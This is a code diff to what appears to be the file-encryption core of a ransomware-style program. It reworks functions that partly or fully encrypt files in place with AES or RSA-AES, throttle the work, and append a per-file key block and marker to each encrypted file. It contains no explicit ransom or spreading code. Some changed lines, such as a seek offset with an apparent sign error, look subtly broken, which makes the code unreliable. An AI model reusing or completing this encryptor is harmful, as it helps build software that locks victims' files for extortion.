@@ -144,6 +144,11 @@ static bool EncryptFilePartly
 	BYTE DataPercent
 )
 {
+	if (FileInfo->filesize < 300)
+	{
+		LOG_ERROR("[EncryptFilePartly] Failed - small size file, size must be >= 300 byte. Filename: " log_str, FileInfo->filename);
+		return FALSE;
+	}
 	BOOL success = FALSE;
 	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_throttle_time);
 	size_t written = 0;
@@ -178,11 +183,6 @@ static bool EncryptFilePartly
 	BOOL isAes = FileInfo->crypt_info->method_policy == CryptoPolicy::AES256
 		|| FileInfo->crypt_info->method_policy == CryptoPolicy::RSA_AES256;
 	
-	// if (PartSize < 300)
-	// {
-	// 	LOG_ERROR("[EncryptFilePartly] Failed - small size file, size must be >= 300 byte. Filename: " log_str, FileInfo->filename);
-	// 	return FALSE;
-	// }
 	if (isAes)
 			multiply = PartSize % 16;
 	
@@ -224,8 +224,6 @@ static bool EncryptFilePartly
 		while (TotalRead < StepSize)
 		{
 			if (!api::ReadFile(FileInfo->filehandle, BufferStep, StepSize, &BytesReadW) || !BytesReadW)
-				break;
-			if(memory::memcmp(&BufferStep[BytesReadW - ECRYPT_NAMEHEAD_LEN], ECRYPT_NAMEHEAD, ECRYPT_NAMEHEAD_LEN))
 				break;
 			if(GLOBAL_STATE.g_write_in)
 			{
@@ -271,8 +269,6 @@ static bool EncryptFileBlock
 	{
 		if (BytesRead < 1048576)
 		{
-			if(BytesRead > (PSIZE_BLOCK + ECRYPT_NAMEHEAD_LEN))
-				BytesRead -= PSIZE_BLOCK + ECRYPT_NAMEHEAD_LEN;
 			if(FileInfo->crypt_info->method_policy == CryptoPolicy::AES256)
 			{
 				padding = BytesRead % 16;
@@ -357,9 +353,6 @@ static bool EncryptFileHeader
 
 		while (api::ReadFile(FileInfo->filehandle, Buffer, BytesEncrypt, &BytesRead) && BytesRead != 0)
 		{
-			if(memory::memcmp(&Buffer[BytesRead - ECRYPT_NAMEHEAD_LEN], ECRYPT_NAMEHEAD, ECRYPT_NAMEHEAD_LEN))
-				BytesRead -= PSIZE_BLOCK + ECRYPT_NAMEHEAD_LEN;
-
 			if (!filesystem::WriteFullData(FileInfo->recent_filehandle, Buffer, BytesRead))
 			{
 				LOG_ERROR("[EncryptFileHeader] [WriteFullData] failed");
@@ -1044,7 +1037,7 @@ static void memcpy_offset(void* pdst, const void* psrc, size_t size, size_t* off
 	*offset += size;
 }
 
-static bool read_metadata(DESC filehandle)
+static bool read_headname(DESC filehandle)
 {
 	BYTE buff[ECRYPT_NAMEHEAD_LEN];
 	api::SetPointOff(filehandle, -ECRYPT_NAMEHEAD_LEN, FILE_END);
@@ -1053,14 +1046,34 @@ static bool read_metadata(DESC filehandle)
 	return memory::memcmp(buff, ECRYPT_NAMEHEAD, ECRYPT_NAMEHEAD_LEN);
 }
 
-void filesystem::add_ecrypt_namend(PFILE_INFO fileinfo)
+void filesystem::write_metadata(PFILE_INFO fileinfo)
 {
 	api::SetPoint(fileinfo->recent_filehandle, FILE_END);
 	api::WriteFile(fileinfo->recent_filehandle, fileinfo->hblock->pblock, PSIZE_BLOCK, NULL);
 	api::WriteFile(fileinfo->recent_filehandle, ECRYPT_NAMEHEAD, ECRYPT_NAMEHEAD_LEN, NULL);
 }
 
-PHEAD_BLOCK filesystem::init_meta_hblock(PFILE_INFO fileinfo)
+void filesystem::delete_metadata(DESC filehandle, size_t* filesize)
+{
+	if(*filesize < (PSIZE_BLOCK + ECRYPT_NAMEHEAD_LEN))
+		return;
+	api::SetPointOff(filehandle, -PSIZE_BLOCK + ECRYPT_NAMEHEAD_LEN, FILE_END);
+#ifdef _WIN32
+	SetEndOfFile(filehandle);
+#else
+	if(ftruncate(filehandle, *filesize) == -1)
+		return;
+#endif
+}
+
+void filesystem::free_hblock_mdata(PHEAD_BLOCK hblock_t)
+{
+	memory::memzero_free(hblock_t->pblock, 256);
+	memory::memzero_free(hblock_t->ctx, sizeof(laced_ctx));
+	memory::m_free(hblock_t);
+}
+
+PHEAD_BLOCK filesystem::init_mdata_hblock(PFILE_INFO fileinfo)
 {
 	size_t offset = 0;
 	PHEAD_BLOCK hblock_t = (PHEAD_BLOCK)memory::m_malloc(sizeof(HEAD_BLOCK));
@@ -1070,20 +1083,10 @@ PHEAD_BLOCK filesystem::init_meta_hblock(PFILE_INFO fileinfo)
 		.pblock = (BYTE*)memory::m_malloc(PSIZE_BLOCK)
 	};
 
-	if(fileinfo->filesize >= PSIZE_BLOCK && read_metadata(fileinfo->filehandle))
+	if(fileinfo->filesize >= PSIZE_BLOCK && read_headname(fileinfo->filehandle))
 	{
 		hblock_t->crypt = false;
 		fileinfo->filesize -= PSIZE_BLOCK + ECRYPT_NAMEHEAD_LEN;
-
-		if(GLOBAL_STATE.g_write_in)
-		{
-			api::SetPointOff(fileinfo->filehandle, -(PSIZE_BLOCK + ECRYPT_NAMEHEAD_LEN), FILE_END);
-#ifdef _WIN32
-			SetEndOfFile(fileinfo->filehandle);
-#else
-			ftruncate(fileinfo->filehandle, fileinfo->filesize);
-#endif
-		}
 	}
 	else
 	{
@@ -1105,23 +1108,9 @@ PHEAD_BLOCK filesystem::init_meta_hblock(PFILE_INFO fileinfo)
 		//fileinfo->crypt_info->gen_key_method(fileinfo->ctx, GLOBAL_KEYS.g_Key, GLOBAL_KEYS.g_IV);
 		//ECRYPT_encrypt_bytes((laced_ctx*)fileinfo->ctx, hblock_t->pblock, hblock_t->pblock, PSIZE_BLOCK);
 
-		//fileinfo->filesize += PSIZE_BLOCK;
 	}
 	
 	return hblock_t;
-}
-
-void filesystem::delete_hblock(DESC filehandle, size_t* filesize)
-{
-	if(*filesize < PSIZE_BLOCK)
-		return;
-	api::SetPointOff(filehandle, -PSIZE_BLOCK, FILE_END);
-	*filesize -= PSIZE_BLOCK;
-#ifdef _WIN32
-	SetEndOfFile(filehandle);
-#else
-	ftruncate(filehandle, *filesize);
-#endif
 }
 
 STATIC VOID dump_hash(CONST BYTE* hash, size_t len)
